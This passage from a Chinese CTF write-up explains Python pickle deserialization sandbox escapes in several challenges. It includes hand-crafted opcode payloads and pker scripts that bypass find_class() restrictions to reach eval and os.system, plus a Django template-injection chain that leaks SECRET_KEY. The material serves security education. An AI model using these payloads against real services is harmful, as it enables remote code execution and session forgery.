&lt;p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入builtins模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>builtins&lt;/code>模块&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>更多知识参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | [Python 的内建对象](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，docker地址-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了&lt;/p>
&lt;p>审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app&lt;/p>
&lt;p>看core下的settings.py比默认的配置多了54和55行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
&lt;p>用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>依旧是重写了&lt;code>find_class()&lt;/code>方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链&lt;/p>
&lt;p>（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>，注册一个名为这个的用户即可获得签名的密钥。&lt;/p>
&lt;p>再掉头回去思考opcode的编写。重写&lt;code>find_class()&lt;/code>之后限制很多，但通过builtins仍然可以用&lt;code>getattr()&lt;/code>；那么就分两步走，先通过&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>来获取&lt;code>eval()&lt;/code>，再执行代码。那么如何手写protocol=0的opcode捏？&lt;/p>
&lt;p>首先引入模块builtins和函数getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后需要获取当前的上下文，用globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>globals是个字典，所以还要获取dict这个对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>还要执行globals()获取完整上下文&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>栈顶元素是builtins.globals，压入一个空元组&lt;code>(t&lt;/code>，然后用&lt;code>R&lt;/code>执行&lt;/p>
&lt;p>然后用dict.get()方法从globals的字典中拿到键名为builtions的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反序列化后得到builtins对象&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>；之后再用getattr从builtins对象中取出eval，也就是再套一层娃&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>现在已经拿到了eval对象，再执行代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入sys模块名字中不带点号">&amp;ndash;&amp;raquo;仅可以引入&lt;code>sys&lt;/code>模块&amp;amp;名字中不带&lt;code>.&lt;/code>点号&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
&lt;p>审计一下源码，先看一下肯定会不secure的securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>重写&lt;code>find_class()&lt;/code>，被调用时可以灵活添加白名单；再看看server.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块&lt;/p>
&lt;p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃&lt;code>sys.modules['sys']=sys.modules&lt;/code>。那么如果我们先从sys中引入modules: &lt;code>import modules from sys&lt;/code>，然后将&lt;code>modules['sys']&lt;/code>改为&lt;code>modules['os']&lt;/code>就将成功引入os模块。&lt;/p>
&lt;p>但有个缺陷是modules为dict，需要用&lt;code>getattr(sys.modules[module], name)&lt;/code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;modules&amp;#39;)
modules[&amp;#39;sys&amp;#39;]=modules
modules_get=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;get&amp;#39;)
os=modules_get(&amp;#39;os&amp;#39;)
modules[&amp;#39;sys&amp;#39;]=os
system=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;system&amp;#39;)
system(&amp;#39;dir&amp;#39;)
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;csys\nmodules\np0\n0g0\nS&amp;#39;sys&amp;#39;\ng0\nscsys\nget\np2\n0g2\n(S&amp;#39;os&amp;#39;\ntRp3\n0g0\nS&amp;#39;sys&amp;#39;\ng3\nscsys\nsystem\np5\n0g5\n(S&amp;#39;dir&amp;#39;\ntR.&amp;#34;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入题目中自设空模块">&amp;ndash;&amp;raquo;仅可以引入题目中自设空模块&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>稍有区别，在&lt;code>getattr()&lt;/code>之前先用了&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>这次的白名单是&lt;code>structs&lt;/code>，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>是所有模块公有的字典，记录所有的内建函数，可以通过对&lt;code>__builtins__&lt;/code>内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。&lt;/p>
&lt;p>我们知道，&lt;code>__getattribute__&lt;/code>魔术方法可以访问任意属性。而同时&lt;code>__import__&lt;/code>并不是铁板一块，它的全部参数是&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>，它可以被替换（通过导入builtins模块并赋值给&lt;code>builtins.__import__&lt;/code>）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了&lt;code>__import__&lt;/code>，现在我们可以劫持这个__import__，让它变为&lt;code>__getattribute__&lt;/code>，让我们引入的structs变为&lt;code>structs.__getattribute__(structs).xxx&lt;/code>。&lt;/p>
&lt;p>对于引入模块的检查只会出现在b&amp;rsquo;c&amp;rsquo;时，所以我们在用&lt;code>S&lt;/code>操作码劫持&lt;code>__import__&lt;/code>时并不会引发find_class()的过滤。&lt;/p>
&lt;p>然而我们不能直接getattr()=getattr()这样覆盖&lt;code>__import__&lt;/code>，我们还需要&lt;code>__dict__&lt;/code>的帮忙。&lt;code>__dict__&lt;/code>是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。&lt;/p>
&lt;p>所以整合一下上面的思路：我们先要引入助手list&lt;code>structs.__dict__&lt;/code>，取出structs空模块的内建函数（一个待取的dict）&lt;code>structs.__builtins__&lt;/code>和我们需要的魔术方法&lt;code>structs.__getattribute__&lt;/code>。之后从内建函数&lt;code>structs.__builtins__&lt;/code>中将键名为&lt;code>__import__&lt;/code>的值替换为&lt;code>structs.__getattribute__&lt;/code>，然后借助&lt;code>__dict__&lt;/code>将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b&amp;rsquo;c&amp;rsquo;从structs中引入get时触发find_class()中的&lt;code>__import__&lt;/code>，也就相当于在执行&lt;code>structs.__getattribute__('structs').get&lt;/code>，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数&lt;code>__builtins__&lt;/code>，所以利用这个得到的get方法就可以从&lt;code>__builtins__&lt;/code>中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS&amp;#39;__import__&amp;#39;\ng2\nsg0\nS&amp;#39;structs&amp;#39;\ng1\nscstructs\nget\np5\n0g5\n(S&amp;#39;eval&amp;#39;\ntRp6\n0g6\n(S&amp;#39;pickle.sys.modules[&amp;#39;os&amp;#39;].system(&amp;#39;cat ../flag.txt&amp;#39;)&amp;#39;\ntR.&amp;#34;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
&lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
&lt;h3 id="--变量覆盖">&amp;ndash;&amp;raquo;变量覆盖&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子7 - [高校战“疫”网络安全分享赛2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了&lt;code>R&lt;/code>操作码，同时重写&lt;code>find_class()&lt;/code>限制引入模块为&lt;code>__main__&lt;/code>，两个考点）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
